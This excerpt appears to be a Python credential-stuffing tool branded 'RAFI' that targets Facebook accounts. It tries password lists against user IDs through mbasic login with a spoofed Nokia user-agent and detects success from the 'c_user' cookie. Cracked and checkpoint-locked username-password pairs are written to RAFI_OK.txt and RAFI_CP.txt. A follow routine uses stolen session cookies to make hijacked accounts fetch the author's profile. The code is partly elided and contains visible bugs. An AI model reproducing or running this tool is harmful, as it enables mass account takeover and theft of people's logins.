...
logo =                                          """   
8888888b.         d8888 8888888888 8888888 
888   Y88b       d88888 888          888   
888    888      d88P888 888          888   
888   d88P     d88P 888 8888888      888   
8888888P"     d88P  888 888          888   
888 T88b     d88P   888 888          888   
888  T88b   d8888888888 888          888   
888   T88b d88P     888 888        8888888 
\x1b[1;90m_______________________________________
|Author   | MR-ZIHAD (RAFI)      |
|Fb Id    |  Md Zahidul Islam        |
|GitHub   | MR-ZIHAD              |
|Version      |          0.0.1             |
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRAFI_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRAFI_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back RAFI Menu ")
	    Mr_Zihad()
...
def MR_ZIHAD():
    ...
    print(' [E] exit ')
    print('')
    _Mr_Zihad___ = input(' [?] Choose option : ')
    if _Mr_Zihad___ in ('1', '01'):
        __xxx__().Mr_ZIHADx(id)
    if _Mr_Zihad___ in ('2', '02'):
        os.system('https://youtube.com/channel/UCHjWhH9orDaDLqPAUBrl6uQ')
    if _Mr_Zihad___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[RAFI] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
              ...
              "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [RAFI-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('RAFI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [RAFI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('RAFI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100025292940409', cookies={'cookie': coki}).text, 'html.parser')
